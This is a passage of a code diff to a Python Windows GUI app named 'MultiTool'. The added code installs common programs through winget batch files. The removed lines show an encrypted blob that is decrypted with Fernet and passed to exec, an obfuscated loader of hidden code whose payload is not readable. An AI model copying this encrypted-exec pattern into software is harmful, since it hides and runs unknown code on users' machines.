NJuUtlfYIgEZdJHKYpUkH4wYmY0i9LARcY9bDsv1bcCGC3t1HZYfhvIr5usU_d_60V9BVYxN8RcpcgeyTRZxbAljSkCOVPJbJc0BLetF5Tbpa4lleVNYGbCMWHkU6T-E2f3qvYS7YEeywMDxXa1F6xmCUcqaaUjr3c6X08XjWeWDEZWZs6Wu-BNZldlHknH6D4NobBibY0JdSG4XWVj9dJmWaSabLjhlq9-qjw66I4WkuQZJEi0yOwm8Z2JFK2MG99KEuXfLZJdIl8vHEvnE3LKsK0wjZZWw07yIRbkV_uehyEM-mZaJs0KL8IpztV7geXHWaFn2JJZz3xeWERW999OvYkjw_BXeEp0-F9aT7Bep_I7B-r_B04tmQhPpEYZWTDCytot4CLFqd9Xb1lXgHyhTlg3je9P295U9gzUmBDQNMjBkuLQJXKHZzdTh23aRZhdxnhbztA8Vi15YqckFoQqeHS9Ne9UDpypWQAaJ17IUAXLuAon1ZRS4_mQSDouENHWqM8MgXDuWcMcWzN9GFAlElVtXAiZqypM48ep7lnOsLGcw5hMkYiLpsTH9_wb0htDM1J8YcAKxudY9sqMGChuOsp92QBTwvL-oY1Q-CweXa21r-qX11e7YR5rgJg_AAnB-aaJQeg1wUHwK_KiNZQUq5NtHmgqI_LBLd6AkzyHcSkk57Ob0D_rHezW4YPmKEgyuen48ULZa8c37B-zMUQDx0aUDkY6Lm8yKElH2yKevdV2hJFQWMgw4_XC9mKG909OlGfML1e8o9ugwxi7_7rY5tJ1nyZGorKFDMJ6RIEiFASPg4Ot5PAfvPj-9cWvnlk_Gg89GlLlONFLRonSwnL0wCw3ZOH8gdTSBK3OtSovB78jHXUyaY_mjuEeE6lvBTX1LVgQfPdYz-lqZPLTqvkvDzRiA7mi6Ry7_dzifeEN_IehVWHHU8aFXkoOvDoY1Vms_QEkKNpuaS1tCJ0ZbWisuzDNA3OA9zom_L3hC2HDgzJ00vmCiSBOfTfvdXqpDs7ekSgrBCrv535XzyrdUzxTv2nXUxvxDUZ5B4QQihgiXlF0lRJPodg7KFqOv5Hdd5dQbQHfqby-wCV7qwirHDqMsZi80eVkcIT4u2ODqvC5ym6JiXHy_-5ohVJTmkE2DCTtpYpdH29LPmuxB_N5ryDUeTd6s4DF65imFYsyGil1AMYd0ll4SPs4RDhrxwPIfPd62nV8oXsjE5kOo5BmQK1gSJatPht-Ng7UGAcapeGGH57RZpoAf_1k5dXvPYzhMsMaa-q3xUicqeulTYYC3Yegwm40SpOtu3alaH8RYrxtVjZos8u4-euF8Qs48dxicPb7K8X0IHiCeeAmX6tsibHKdZahyWLD0f4row0lhGbn9KeQSQWEfGQZdC1H2tbxGIRofz-MvSrKjL_cSWEyx4YjGoKwqvN5RtOWreFQ_vZofbRw8rt3tcFxBaMh3lr6mI5lq5GZu2sEpJFVmlWjkM6FcEJ0Xa9G46sUW3d7d2aMg85BfHCIpQqIzxhq6BTVMTTKYzBJ_cVNkkNRmuuG9DoYdLMXOzyN59KdaMb9SzvbUBauhtaHKzI7enfbCze4wvDRmCG8eW_yKRy6ArkG2vnNO0wiCm5-Xw-pJX7fIGj8aR6sA5lreuwTfBmxT5XraEQPHRSe7uiKHtMDsmI3cug-aQ8mHD0GYiBND4GuiNggaLVreUmOwf9I_L_quTOQee-Icg69-H1dPD-OoKlJTzdo25NdQQ2CbQ043UVrEJ5_pVBJK9UvCkCkGv0-9aeKp3S6-MJnTQbA11GNI-83J8-ZsBIoM2Td1WmVh1QnIXiqYBPQAWLXfnvgIEpDlV2tmjWyMutLze80cfoX9Gkn_SLIG3HhKLyU9PCZlpzNjWpRVXQ_uT1HieDo_1_CKzYH9hpJbzSyoRb_HC03TO4OohRUfCL93omx8wVyFN6SBfoM7SaN1h3ulOVn_cY73tvWbZ_lzW5667xdMP_UVnJ27r1zxEbkdZOWmAnDQxuOy1Os_wAePnF4G2pthB5cROgKxDwRLfhrxdMk6RSdpXlBzBO6IVUavhD76YeZYQfeuLPupXt9DcYf_fQannm50i9JzA9aYpbw8IzNZjlCE836glQ1LDfPiTpfOVzNrB-Kx4Ry80YKRK8q5WXEhJ1gZ9F_9DYKWz-aHOHo-x47Zzb5bPNN4aBAUkEZ2DpCKc3Dp_NYbKw0UeKuVshNOJOxVvf-ShYbnvf2vymTnuHwO4ZNu89Zxe9Kvy9dT03u_v9axiELrxJwD73dhuJ20LYwWEWmZh1GW41metsEOWOjXMxgo2k_onXnIfDryy-eB_yDdsBUgeDcrCE1OiP-9vJtNU0Dqgn8Aefey2RbEphnhIOhsrYnYVrPLNQbkuMZUKXwUMesIXL1U9Mql2lsC8wAHZwdqaIGUNsKiRvRVIuSouHqeO8nNJ6yvhe1CF3URQ8JRIMeuWtLLW23rBKVAevjBSjITUxu06wlgpg8AXIC4jWBYKt2PSQW82wO7JwxIyD1LpZFvkkA5wVNToeGTGE0sPl6KflzLH5IxDti6g-8vVU0WnzKt046-oxswvFyyk6IH5-_pGNVitD1wkAtKje3UN4PRfXhVCu8_SSYu4bzaGFRWw8hwYW0LPnRtLLJf_5sk2oq3DYBXepQJk1A9eitwu8-tRxmxgSYHHD2j6a1pQTKmBoqQPRdhPuNqLCuwLeBC_FoMQvyJscuod2DYh1HMq7ULrGroKU-13-ND-exBGHOTlI9PkgDPuw106iirwt1V4Tco449C2f2KEo7Pq6ZrkqKHIx4g3lds3hyRQwI8Leucd7JJlCLGuIQZNYn5nJO8Uzmqh9dkAQlhiKc6_xX3BkIZuPWIGmp5BRHzVGIVeSr7TPHS9ZqPBwwbTSXjR4uIIzRXbqR9orivjlBCM_10zOO5CgggLg4xr6M65ecsj5sPo9UNFAzEHlRwBOXI5o2aUPLNHZaVIbN-XsAcWxAFmBq58E4uByXDb26JytvW8R5Dksg9gviFp5TRHpP3dLHbcER3JYLu-Fv92CgmUgxrsEBxYOmWY8PQnPrpVp2UyNOKDgVVqCzopotPRq0VQ24AalC33xb0UdW8Ot2Muk8TjlUz-zt454HzfIHcX2zygv8mW1F0D3SpLVqkwF-BrjfCQzamP5hculx3qcEcu1zNi1L2X5RRwx9-5OlhGjiMF_SzjNy29r_ym8i2w52p0ivUDsxeqtme5uq8rrIXN4CDCbnaitQsV0lhbhdYS82lJ89ZHAiky5pd6F4y8OQrJBfJ4rqIJuScJHj_UcZIf1HlXCzZsG34CbTZ1MQAuLgcVLKgTPYId6GN6ngY2Pc0gpRO3VPr0uDnlWLEO7YlLLeNMPnoK2zneBNw_AMJ7807PkpdTlbuBKYhdnBcCH52KuE7GUsr5sWyxR6inHsXga-bK5hr-0y8SWI1RU4v8nBBwlLxJiW8aFKpwLZzA11K4tGeTh4Xf3Z6rqZirXZVDUkVymudQNUlvMF4N1cx3MhvMqzKL-kTd3HQDkIpfPaafaeFv45ExSwjmMu6mET4L46ts4xLt2pwyjAnZax0XBR8qrK3snSMuGOsWL-V3_CexzKetdhiibkKnLg0GZkDRe4tLSGQuwTp_9ARv_dsxwLxgxYMThixN8FMukgmKBJ3nkDk6uNxErHUuZDLe01Z5LKIOPV1HEKbp5dKRxH-eVAqO9gxTwJUM4-J1FQzGbPL8pR9fXedOqE6no65ZX0IlDDXTN6dP5e9WF8uEdCW4OO7D2t-Zuz4mJzACJy4LZd3OWK94tA8wOoYpadNT-_ZoaxNfNOWJQh01sv2a0_ZM1W4vamCKCoxB0hQuOP8tlPR42BzUnFUDNnJqqf3FJjWzgWcFYn6-6vQY-ko-C8n55Wfu__EQoHbsIG73t8a7IhV69Ob6uRIO9q4WRKSpMSudU3q8nibREvRJkl7quJxATnmZ1LeHcBFJJ0DT-m_Aa90U9vxAPQ3r8lLJxnBY86xWw82FGlsJxkgaYUz9ScdgaePXaJFQaw3rCkBNsNuhiqTdcG--dglTTrvFl--IRsXQvfWjlPnIb8me201kpsx6gmoZgMRRIfIRkz2sRdJJyErIE0uTel5tZiE9YP8MPDzmKSSxpn66AgQZIomF0hc27iN_VNmPVxbqlHsYamIikFWeBBKATjy5QQJ1gAvXAF3Cby7HSKrhXJWCi1D02OSCnWUod-rwkT_yokNL_oY2qn41ug5Z3ixobzVv0MoL1w8YBkgFzoVPecjkn-Dbt2-hXghf_AgsZwo4hGn3zLhCFvNMWRn51UCMcz65ZMDXlYEftPxOn1_TEgn_pFqH5zOyHTLc-hx6XPdQCC3zrhPAkCPBpV_lWte7yTcEqv-iLgTwWCnkA9f36A6lgK8NVYwnWHWVsvWrBv-N1cbXqz3ytM35ZDfYDkyuPRdc5Ill8EcDrKi5K-yNRLeYKGjlWvyIO8gKzj0Qfqe08L6fMb84fiopOm4dzB8CRpqZ-ZB7ZnFoLzI2BIbU53z0b8QZUxpeByNDZDB79mRcr2r61AJjbbjHD_XjTRSDBFL6ASyj3AShql_kPMadzWKPbKP3y1IgFmOtlSHdzbFyLLxpPIsmoK1MkKBbPjThetq4BtJewDoCZwAN2E-2JZLf4cmEPCQ_7qpa5u-FReUMdI9uwXzKWKYJfnIweZNUUn7NA2c9of6v80mf1syoHP9DZrZzwo9NuaomM_lfoFBooqU1w6B2WHF5X0pUYSy0W81GeT237p-VtNrRI91gC80Zzv_RpH-o3rlzcIGowRCStkev1atV4KQ46j6R2Mu70ycO82SDpzQ610ixCaDQ4O7A85Hp1NsxTRTV1w7bvNuAjYk27rfDpiAS0MwqFicDIPOevBqqxtdgHDpGRxVP7cf5NY7RkZumjf-VfcswA-uSyIm-9MU5mbPoNi8H68PrwYGvi6zf5gyUVtedRXkAkvtocH2v7YFfFGBPXnKFwdK95dZOct0DrqtNUF_tHE1RFwmeLAdKqrABdYlBd5enhAfe7sRb2dQ1_FEBZlX9CrD8ejhxXA9aDvXd9i1UpAgzwuBvIQqNmYkMekD6XAbKBfRw2825En2Rr0BVIKgHOhF7LzIRRPv9LB-y6jdc15mhzyw5lYgb6nCjAOdIC0P0yR0_5duFZZc7eqLYKXeUVokJCO8_CsPnPSokstnb5JFXEZ9KH0LZL_wwVqI5oP6cINmvAMEGmQk-cuki40gJCeyLzduGTsAo0T0c7GNhQuABQ4u-9oFjNmZDZ6IUx5h5bpfFEHJuLXkgMg8JwAdZ-0l7wwmu55Mj0IrQRywQDwlGlKAifWLP18bRATio1-dx2VVj64hOr444Pyxzyku359q-u5EaN3mqSN3W-CMpAhbxen2K-llnEcgZvKuP68G3Vnludq-0aFAYuUOWUtIjxm1mgKnyXmUgAdBtQeT1EIrkrsukrK6aY9u2atHPNb0_NirzO60_dqDaMuuijxUTNyJto2NAERCud2iBvstvAsKIlylqvKGow_5FZ6l0d97mAtke4PcLD5c8W03G3Pa6j4m_Kws15MgkGgsU_ZHOi5uJ27PGhemmZqalX8zttr4lcqUPNT2HBZsVYrKtFiXsZwotxQuYZtxTNueSnMLLpkYhkykFECnYv1GHI1FYGLqySdZRmIU9VhiOxmtBH565jnsRHAGwQtmN7wr6TsnhOgzgA3NXYhqKKyoM-4ab4eFh79rr1zxI2vc1fEF-fzLXPoSMDyiAQuoTCcChtQsvAYZrMdiuIuwZd2Lxic7WnhsWuZvG_Ze0pfDvCReMdZ9z0xyiqXtIzVh1ODSXtESPt7B_snFdiaDk1ZinicNzfrWiZI-wCak3sKWOdAHil2j1x4Vu4L1P4HjSs7rfkGJglPMuKuZLpRMkMfA_mmfMpgdVSMBKNq_yJaG0gY0VO3o7QzziYLGcBjo65k8vO4l7kIFERt-1wtJMz-ZiyEjRfKK9zl9l0vvab1l0ZYlRFCEoamBRIie6_9Mjde6_jyiXqkKu_JP7nbIZNGDV81Ud-OVA0YCa3hSlTxOK6WDvPm0JJhxzTYV7N6xMMvYoeYYbBO35vrNhp73Sk7MHMJWtXnZjvU7CoR1HxUVyTH_eLRSmlgquRrTWSSpcyl6JLN19XCB3FEXKgfzSS96uG2IiuT3z-Q424osrJA5ulDmHSa525pe9lv4kDZAXnHWLHltGdE_aJShmPaIu_z5GG_qHAk1a1R1xZYqKzDjaYoev8FGFZUxaw0h8uliN7CQTE2e20GWXOgLiDz0_WIZuzWx287vpxdJmHXDLRk0XlV3ze_LDS_RqcYhkJb2cAEl8CW3oB9GN1Bx6ECjy8x8ePErZ0EsNOu3_KVAEqeXFbGOIJkIkqNhGSDJoSldx11ly5iOxS1HypEnK0Iz3b6pYq2dbo2ue8-yFOfzhsd2-xhEIeOvlLvFZCpbAW7JzkXNEdiANXuekiLa4nTvGo6HhOdupcFEwE1oACIp9pf13x2EST1pC61Zl0DbOdk_PbOUe6aZ1OvKziFt-j9HFIXeF9t79I_tC7HBD17HcgMCqW5EKPbRaLrZr-N1CwDMM53dDAavAFZl3VdT23r91yHtVfXwZ588eNxRlrrl9ehtsqy_aML9Y-cedmy5-s-8Ec9UUIAl5fVBf995eOqPqTn6OExWeKOJhPhQwQD5wgnidY6mWXV_uUPsv133fR6Sh2ZvOpkKTcPzVaJVz-hC7AwEQLdUKBILPKGOhkAkYUvXaR_-GfX8jmAVmcciLHIySBqoZPOCPfNQzcwjZmPAWj9e5-Q1QO-mhvN5XLIgGaaBiHulXUxkJHzAd6XO5ojnrHwDusBk0WTUlwWr3hv2286ebEJr96mkyf3wN1mRxLN3K7V7Rz0BjUQ_YYQtud1nzrBSyzdZuqWwGI-SpR0TnM78btQrhqXklgtIlrZVXyVK6jTF-jk1DuGvFDn2s1fE1EoXgZxWphtZU-YgFUq75BTlsiG0Y3L6ERPk_JlU02RVKRiJ5wZH0rAwL5fQzeI-LK1e5Fl2Q2fiCsFeFZcp_Kn2A15Ng_beSJqwsG4nheQw2X5XMuJprgAgkyWP0Xb4P1NACCVj4Q8FytAt6NDuAvz0xLVEHQKlRgByvg-KIugyee-etipgZnZgSZm4xEom51zAdjQv3BAd5XBVaVWmEZYSjSzQVcDMKkfM3zPVoiLQa6wBkpfhRCiz1G2IlKpppgODDvSPJnt3bIJdgo3zhXrhSY9zqNOkEcP9Hv_iMYgrnSHK5KpuZh6rpgNX1G7glIq3JEDWzlbIMX4eJvGjJ2_py28_27l6YDzglASs8Veq2QPSRUb5Iw_RK5FQiidTfYdlgWYwXfwWbR4fCMCsg9LLWK-E1AP_RvTLbUL5FWS2eY42yjAv0jVPtse8BGx66qL7fZkNfpf6HTalJu0Cwwh0iOvcvV06kZtkPOtIOf1yS0HT8FTc6TrSR8mp86SwAtkpi-JWt1pVoENumw2D7UVAOpQxyr_4plmg6LQetBFTKewQUrqcYFGx0crpxAsYLIpbVg6ZbZpf6q4wy6ckpr05Tofg_ZBZCG9lakdjn2lG2zT0bfCHqXS22MsDBGqZ76hEpXvkBcU3971Z3KT0bI-cJ1udmzq-as066TO3Ow2yhl9tmEPPVCktCbGMdayqGaGCfG125rr4Wm1Eb27qm0NAsLj2Co8bi-0CaarOgLuRgagIMiWqdr2aHv-5wF9KvhcrsUDxuyIjKXdHPaP2_J5BMPwTE-0d00K0fkpbcIjGonOBX4oFkr7cECZ7OtZONuI0znCGyBD9hebI5KLJL0E_XW3hQ8F_mlKyQSyTyX7YtMjg3aJGqpjQZsB5TjuqyecCRdkScy1fQxQjk082xi3821HSM-IZv9VSpqLKJO0EyKTTRVVIjIfbhx6gBdzzpeX3_uw9eEjUrUL8Axnx5SgrRUCXMsrpo80XlU5ia0YGx1qVwbcmYUnKm5zjiVrubaEUMsnX572Db-fHW1ozvLsLyGf4S8_R92QGsHwC9nQlAkfY1M6EOlMW3JdQSKKIseQNr4LsQ0pfqk_IeYy_y-nHMLzu9K28ntucLHXeOHtj0rZJCXfk4z6itzm8EOwwS_rSkQ2s3KgWA48d-BHk-d7EtbF0pjRKLNF0QTaluMmTLvRZ4Q5PEKxGnsd3GdBEvivM3rmawx5rn0FnzC--a-NHpWsFOm87v-lRYQhdYxFLu3AGC3z7QXomXb0c7ydO89cB1e8-kGCc6udsbjWR_FjAxD_w1kvncdF_t-YvPlbiyR3dDlizFsdqV9Ud77RuT8pDKDH6lMndKVeIz-Qlawhee50VUnQPu5O6FONdr8nj08uhEz2uYxrNJWi49GOAVvNvHHQx4LWwtORvSpm6m7RRTZMGkyUa3Ule0e1LkQSUiL3UHlTCeFpajRcku0QB8PmZXI-TSdVZLdkEoX5yRfXljvse3PS6-8kZHAGAmzctit44mVoPEMqDsu6_5wHWc7ZBugrSbSMDAhza9RRSYBD5sgxUAb8njlby-lalUlUKOocsBVItrrACDP3x1N2GsxkBZMnw4EFEROxMhVFl_p6p1hIV4-h1d0ra8v-zl5Z_9AE_yHKQ-v2YJV98OdJILakkB9f_YhyPWeZCWj7o1akvsvT-_p0ykkRbucZF2-jsUX6cME1Ea-u_QymPvDlkEWIrjiftNV1KXOdGmpwMj4Zdl1kK2mKyz_2fOyk4BdwaSxI1TiUuVUrRFnAdHZr93BlNqjxhs9JQFKpk2LqwqX-d0GD-OauoQdbTTjELfxo3ggWh-WTCjxPUzhGd5W0cM51JPr60K6SKkKyp_NmkmQV-hpAvEZhJFtfgzVbDA_t6XW1DeWKAcORb_4GVcjTKpPzUH1IU_ZOCcKh9Mz_F8y6NCNJ4fK5uESlVDHOvDBl5z-6fjvABShQhM5V1tydLBMWF7k7azrNC_Nx7AKzntOFdXOD_PGrDDye3vgdtnmPRnchVlg9t4JU9iRCL7g978WbTJaUBVi3Z6j9X0aCISxu_5MhgPGcgwC4SwnM_R3FkXTsIbK1jM6swt2FC_UvinQ5bVCk31yHu5znW5jvRGDjFy9gJ6jVaVLZFv307KbB8PjOgr_9SopjLHAPL-50RFMLVHbpKhzujdxw94RQca5evgMU3CDJfDKOLpeJynG469JcwNxEGec6dzudM5xQ9VcmEw3jrl58Jmrfb9kBtFX8gE_Zg==
-"""
-contents_decrypted = Fernet(key).decrypt(code)
-exec(contents_decrypted)
+import tkinter
+import tkinter.messagebox
+import customtkinter
+import requests
+import urllib.request
+import time
+import ctypes
+import sys
+import random
+import string
+import subprocess
+import psutil
+from datetime import datetime
+import smtplib
+import string    
+import random  
+import pyglet
+import configparser
+
+def update(app):
+    global apps
+    apps.append(app)
+
+config = configparser.ConfigParser()
+apps = []
+
+if not os.path.exists("config.ini"):
+    with open("config.ini", "w") as f:
+        f.write("""
+[Settings]
+appearance = System
+color = blue
+        """)
+
+
+user = os.getlogin()
+
+config.read("config.ini")
+appearance_mode = config.get("Settings", "appearance")
+color_theme = config.get("Settings", "color")
+
+customtkinter.set_appearance_mode(appearance_mode)  # Modes: "System" (standard), "Dark", "Light"
+customtkinter.set_default_color_theme(color_theme)  # Themes: "blue" (standard), "green", "dark-blue"
+
+
+class App(customtkinter.CTk):
+    def __init__(self):
+        super().__init__()
+        
+        # configure window
+        self.title("MultiTool")
+        self.geometry(f"{1100}x{580}")
+        
+
+        # configure grid layout (4x4)
+        self.grid_columnconfigure(1, weight=1)
+        self.grid_columnconfigure((2, 3), weight=0)
+        self.grid_rowconfigure((0, 1, 2), weight=1)
+
+        # create sidebar frame with widgets
+        self.sidebar_frame = customtkinter.CTkFrame(self, width=140, corner_radius=0)
+        self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
+        self.sidebar_frame.grid_rowconfigure(4, weight=1)
+        self.logo_label = customtkinter.CTkLabel(self.sidebar_frame, text="MultiTool", font=customtkinter.CTkFont(size=20, weight="bold"))
+        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Install", command=self.Install)
+        self.sidebar_button_1.grid(row=1, column=0, padx=20, pady=10)
+        self.sidebar_button_2 = customtkinter.CTkButton(self.sidebar_frame, text="Tweaks", command=self.Tweaks)
+        self.sidebar_button_2.grid(row=2, column=0, padx=20, pady=10)
+        self.sidebar_button_3 = customtkinter.CTkButton(self.sidebar_frame, text="Config", command=self.Install)
+        self.sidebar_button_3.grid(row=3, column=0, padx=20, pady=10)
+        self.sidebar_button_4 = customtkinter.CTkButton(self.sidebar_frame, text="Other Tools", command=self.ot)
+        self.sidebar_button_4.grid(row=4, column=0, padx=20, pady=10)
+        self.scaling_label = customtkinter.CTkLabel(self.sidebar_frame, text="UI Scaling:", anchor="w")
+        self.scaling_label.grid(row=7, column=0, padx=20, pady=(10, 0))
+        self.scaling_optionemenu = customtkinter.CTkOptionMenu(self.sidebar_frame, values=["80%", "90%", "100%", "110%", "120%"],
+                                                               command=self.change_scaling_event)
+        self.scaling_optionemenu.grid(row=8, column=0, padx=20, pady=(10, 20))
+
+        self.textbox = customtkinter.CTkTextbox(self, width=250)
+        self.textbox.grid(row=0, column=1, padx=(20, 0), pady=(20, 0), sticky="nsew")
+        mesag = """
+        End-User License Agreement for "Multitool"
+
+        This End-User License Agreement ("EULA") is a legal agreement between you, the end user, and Luca,
+        the manufacturer or distributor of the "Multitool" software product. By installing, accessing, or using the "Multitool" software,
+        you agree to be bound by the terms and conditions of this EULA.
+
+        1. License Grant.
+           Luca grants you a revocable, non-exclusive, non-transferable license to use the "Multitool" software for your personal or internal business use.
+           You are not allowed to distribute, sell, or otherwise make the "Multitool" software available to any third party.
+        2. Warranty.
+           Luca warrants that the "Multitool" software will perform substantially in accordance with the accompanying documentation for a period of 90 days 
+           from the date of your initial purchase.
+           Luca does not warrant that the "Multitool" software will be error-free or that all errors can be corrected.
+        3. Liability Limitations.
+           Luca will not be liable for any damages resulting from the use of the "Multitool" software, including but not limited to direct,
+           indirect, incidental, consequential, or punitive damages.
+        4. Termination.
+           This EULA is effective until terminated. You may terminate the EULA at any time by uninstalling the "Multitool" software.
+           Luca may terminate the EULA if you fail to comply with any of the terms and conditions of this EULA. Upon termination,
+           you must destroy all copies of the "Multitool" software.
+        5. Data Collection.
+           The "Multitool" software may collect anonymous usage data for the purpose of improving the app and providing personalized recommendations.
+           This data will not be be shared with third-party services.
+           The "Multitool" software will not access/send any personal files.
+        """
+        self.textbox.insert("0.0", "Terms and Conditions:\n\n" + mesag * 1)
+
+        
+
+    def update(app):
+        global apps
+        apps = []
+        apps.append(app)  
+    
+    def setvar(self):
+        global value
+        value = self.optionmenu_1.get()
+        print(f"Value is now set to {value}")
+        if value == "Chrome":
+            cmd = "winget install Google.chrome"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Opera":
+            cmd = "winget install Opera.Opera"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Firefox":
+            cmd = "winget install Mozilla.Firefox"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Brave":
+            cmd = "winget install Brave.Brave"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar2(self):
+        global value
+        value = self.optionmenu_2.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "7-Zip":
+            cmd = "winget install 7zip.7zip"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "PeaZip":
+            cmd = "winget install Giorgiotani.Peazip"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "WinRar":
+            cmd = "winget install RARLab.WinRAR"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar3(self):
+        global value
+        value = self.optionmenu_3.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "Zoom":
+            cmd = "winget install Zoom.Zoom"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Discord":
+            cmd = "winget install Discord.Discord"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Skype":
+            cmd = "winget install Microsoft.Skype"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Pidgin":
+            cmd = "winget install Pidgin.Pidgin"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Thunderbird":
+            cmd = "winget install Mozilla.Thunderbird"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Trillian":
+            cmd = "winget install Trillian.Trillian"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar4(self):
+        global value
+        value = self.optionmenu_4.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "Spotify":
+            cmd = "winget install Spotify.Spotify"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "VLC":
+            cmd = "winget install VideoLAN.VLC"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "AIMP":
+            cmd = "winget install AIMP.AIMP"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "foobar2000":
+            cmd = "winget install PeterPawlowski.foobar2000"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Audacity":
+            cmd = "winget install Audacity.Audacity"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "GOM":
+            cmd = "winget install GOMLab.GOMPlayer"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar5(self):
+        global value
+        value = self.optionmenu_5.get()
+        print(f"Value is now set to {value}")
+
+        if value == "Krita":
+            cmd = "winget install KDE.Krita"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Blender":
+            cmd = "winget install BlenderFoundation.Blender"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "GIMP":
+            cmd = "winget install GIMP.GIMP"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "IrfanView":
+            cmd = "winget install IrfanSkiljan.IrfanView"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "XnView":
+            cmd = "winget install XnSoft.XnView.Classic"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Inkscape":
+            cmd = "winget install Inkscape.Inkscape"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "FastStone":
+            cmd = "winget install FastStone.Viewer"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Greenshot":
+            cmd = "winget install Greenshot.Greenshot"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "ShareX":
+            cmd = "winget install ShareX.ShareX"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar6(self):
+        global value
+        value = self.optionmenu_6.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "Python x64 3":
+            cmd = "winget install Python.Python.3.11"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Notepad++":
+            cmd = "winget install Notepad++.Notepad++"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "WinSCP":
+            cmd = "winget install WinSCP.WinSCP"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "PuTTY":
+            cmd = "winget install PuTTY.PuTTY"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "WinMerge":
+            cmd = "winget install WinMerge.WinMerge"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Eclipse":
+            cmd = "winget install EclipseFoundation.TheiaBlueprint"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "VS Code(Visual Studio Code)":
+            cmd = "winget install Microsoft.VisualStudioCode"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "VMWare Workstation 17":
+            cmd = "winget install VMware.WorkstationPro"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Windows 10 ISO":
